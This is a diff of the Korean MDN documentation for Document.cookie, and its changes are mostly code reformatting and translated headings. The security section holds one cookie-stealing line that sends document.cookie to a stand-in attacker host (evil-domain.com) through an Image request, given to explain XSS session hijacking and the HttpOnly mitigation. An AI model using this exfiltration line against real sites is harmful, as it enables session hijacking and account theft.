@@ -1,8 +1,8 @@
 ---
 title: Document.cookie
 slug: Web/API/Document/cookie
-translation_of: Web/API/Document/cookie
 ---
+
 {{APIRef("DOM")}}
 
 {{domxref("Document")}} `cookie` 는 document와 연관된 [cookies](/ko/docs/Web/HTTP/Cookies) 를 읽고 쓸 수 있게 해준다. 쿠키의 실제값에 대한 getter 와 setter로 작동한다.
@@ -29,7 +29,7 @@ In the code above, `newCookie` is a string of form `key=value`. Note that you ca
 
   - `;path=path` (e.g., '`/`', '`/mydir`') If not specified, defaults to the current path of the current document location.
 
-    > **참고:** Prior to {{Gecko("6.0")}}, paths with quotes were treated as if the quotes were part of the string, instead of as if they were delimiters surrounding the actual path string. This has been fixed.
+    > **참고:** Prior to Gecko 6.0, paths with quotes were treated as if the quotes were part of the string, instead of as if they were delimiters surrounding the actual path string. This has been fixed.
 
   - `;domain=domain` (e.g., '`example.com`' or '`subdomain.example.com`'). If not specified, this defaults to the host portion of the current document location. Contrary to earlier specifications, leading dots in domain names are ignored, but browsers may decline to set the cookie containing such dots. If a domain is specified, subdomains are always included.
 
@@ -86,9 +86,9 @@ document.cookie = "test1=Hello";
 document.cookie = "test2=World";
 
 const cookieValue = document.cookie
-  .split('; ')
-  .find(row => row.startsWith('test2'))
-  .split('=')[1];
+  .split("; ")
+  .find((row) => row.startsWith("test2"))
+  .split("=")[1];
 
 function alertCookieValue() {
   alert(cookieValue);
@@ -107,9 +107,14 @@ In order to use the following code, please replace all occurrences of the word `
 
 ```js
 function doOnce() {
-  if (!document.cookie.split('; ').find(row => row.startsWith('doSomethingOnlyOnce'))) {
+  if (
+    !document.cookie
+      .split("; ")
+      .find((row) => row.startsWith("doSomethingOnlyOnce"))
+  ) {
     alert("Do something here!");
-    document.cookie = "doSomethingOnlyOnce=true; expires=Fri, 31 Dec 9999 23:59:59 GMT";
+    document.cookie =
+      "doSomethingOnlyOnce=true; expires=Fri, 31 Dec 9999 23:59:59 GMT";
   }
 }
 ```
@@ -124,7 +129,8 @@ function doOnce() {
 
 ```js
 function resetOnce() {
-  document.cookie = "doSomethingOnlyOnce=; expires=Thu, 01 Jan 1970 00:00:00 GMT";
+  document.cookie =
+    "doSomethingOnlyOnce=; expires=Thu, 01 Jan 1970 00:00:00 GMT";
 }
 ```
 
@@ -139,16 +145,20 @@ function resetOnce() {
 ```js
 //ES5
 
-if (document.cookie.split(';').some(function(item) {
-    return item.trim().indexOf('reader=') == 0
-})) {
-    console.log('The cookie "reader" exists (ES5)')
+if (
+  document.cookie.split(";").some(function (item) {
+    return item.trim().indexOf("reader=") == 0;
+  })
+) {
+  console.log('The cookie "reader" exists (ES5)');
 }
 
 //ES2016
 
-if (document.cookie.split(';').some((item) => item.trim().startsWith('reader='))) {
-    console.log('The cookie "reader" exists (ES6)')
+if (
+  document.cookie.split(";").some((item) => item.trim().startsWith("reader="))
+) {
+  console.log('The cookie "reader" exists (ES6)');
 }
 ```
 
@@ -157,16 +167,18 @@ if (document.cookie.split(';').some((item) => item.trim().startsWith('reader='))
 ```js
 //ES5
 
-if (document.cookie.split(';').some(function(item) {
-    return item.indexOf('reader=1') >= 0
-})) {
-    console.log('The cookie "reader" has "1" for value')
+if (
+  document.cookie.split(";").some(function (item) {
+    return item.indexOf("reader=1") >= 0;
+  })
+) {
+  console.log('The cookie "reader" has "1" for value');
 }
 
 //ES2016
 
-if (document.cookie.split(';').some((item) => item.includes('reader=1'))) {
-    console.log('The cookie "reader" has "1" for value')
+if (document.cookie.split(";").some((item) => item.includes("reader=1"))) {
+  console.log('The cookie "reader" has "1" for value');
 }
 ```
 
@@ -177,7 +189,8 @@ It is important to note that the `path` attribute does _not_ protect against una
 Cookies are often used in web application to identify a user and their authenticated session. So stealing the cookie from a web application, will lead to hijacking the authenticated user's session. Common ways to steal cookies include using Social Engineering or by exploiting an XSS vulnerability in the application -
 
 ```js
-(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
+new Image().src =
+  "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
 ```
 
 The `HTTPOnly` cookie attribute can help to mitigate this attack by preventing access to cookie value through Javascript. Read more about [Cookies and Security](http://www.nczonline.net/blog/2009/05/12/cookies-and-security/).
@@ -211,11 +224,11 @@ Cookie: cookie_name1=cookie_value1; cookie_name2=cookie_value2
 Accept: */*
 ```
 
-## Specifications
+## 명세서
 
 {{Specifications}}
 
-## Browser compatibility
+## 브라우저 호환성
 
 {{Compat}}
 
